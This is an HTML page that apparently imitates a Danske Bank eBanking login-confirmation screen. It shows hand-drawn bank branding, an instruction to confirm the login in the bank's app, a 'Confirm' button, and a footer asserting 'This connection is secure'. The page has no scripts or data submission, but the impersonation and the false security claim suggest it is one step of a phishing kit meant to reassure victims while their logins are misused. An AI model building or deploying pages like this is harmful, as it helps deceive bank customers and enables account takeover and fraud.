<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">
    <title>Log on to eBanking</title>
    <link href="./static/css/main.40447a91.css" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
        }
        .container-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #003d82;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 136px;
            height: 29px;
            margin: 0 auto 10px;
        }
        .page-context {
            font-size: 14px;
            opacity: 0.9;
        }
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .content {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
        }
        .page-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            color: #333;
        }
        .icon-wrapper {
            margin: 0 auto 30px;
            width: 120px;
            height: 120px;
            background: #e5f2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .icon-wrapper svg {
            width: 64px;
            height: 64px;
            fill: #003d82;
        }
        .button {
            width: 100%;
            padding: 12px;
            background: #003d82;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:hover {
            background: #002d62;
        }
        p {
            font-size: 18px;
            margin-bottom: 10px;
            color: #333;
        }
        .sub-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }
        footer {
            background: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container-wrapper">
        <header>
            <div class="text-center">
                <span class="visually-hidden">Danske Bank</span>
                <svg class="logo" viewBox="0 0 200 40" focusable="false" aria-hidden="true">
                    <text x="10" y="28" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="#ffffff">Danske Bank</text>
                </svg>
                <div class="page-context">Confirmation</div>
            </div>
        </header>

        <main role="main">
            <div class="content">
                <h1 class="page-title">Confirm in Danske Bank app</h1>
                <div class="icon-wrapper">
                    <svg viewBox="0 0 64 64">
                        <path d="M32,4C16.536,4,4,16.536,4,32s12.536,28,28,28s28-12.536,28-28S47.464,4,32,4z M32,56 C18.641,56,8,45.359,8,32S18.641,8,32,8s24,10.641,24,24S45.359,56,32,56z"></path>
                        <path d="M28,32l6,6l12-12"></path>
                    </svg>
                </div>
                <p>Open Danske Bank app</p>
                <p class="sub-text">Confirm login in Danske Bank app</p>
                <button class="button" type="button" id="confirm-button">Confirm</button>
            </div>
        </main>

        <footer>
            <div>Â© Danske Bank 2026 <br>This connection is secure</div>
        </footer>
    </div>
</body>
</html>
